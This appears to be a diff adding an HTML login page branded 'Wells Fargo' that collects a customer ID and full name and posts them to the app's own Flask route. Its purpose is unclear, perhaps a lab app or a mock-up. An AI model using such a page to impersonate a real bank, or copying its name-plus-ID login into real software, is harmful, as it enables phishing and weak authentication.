@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wells Fargo - Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #e50914;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background-color: white;
+            padding: 16px 32px;
+            border-radius: 8px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+        }
+        .login-container h2 {
+            color: #e50914;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            background-color: #e50914;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            box-sizing: content-box;
+            margin: 8px 0;
+        }
+        button:hover {
+            background-color: #820e20;
+        }
+        .error {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Wells Fargo Login</h2>
+        <input type="text" id="customer_id" placeholder="Customer ID">
+        <input type="text" id="full_name" placeholder="Full Name">
+        <button onclick="login()">Login</button>
+        <p class="error" id="error-message"></p>
+    </div>
+
+    <script>
+        function login() {
+        const customer_id = document.getElementById("customer_id").value;
+        const full_name = document.getElementById("full_name").value;
+    
+        fetch("/", { // Ensure it matches the Flask route
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: new URLSearchParams({ customer_id, full_name })
+        })
+        .then(response => {
+            if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+            return response.json();
+        })
+        .then(data => {
+            if (data.success) {
+                window.location.href = "/home"; // Redirect if login succeeds
+            } else {
+                document.getElementById("error-message").textContent = data.message;
+                console.error("Login Debug:", data);
+            }
+        })
+        .catch(error => console.error("Error:", error));
+    }
+    </script>
+</body>
+</html>
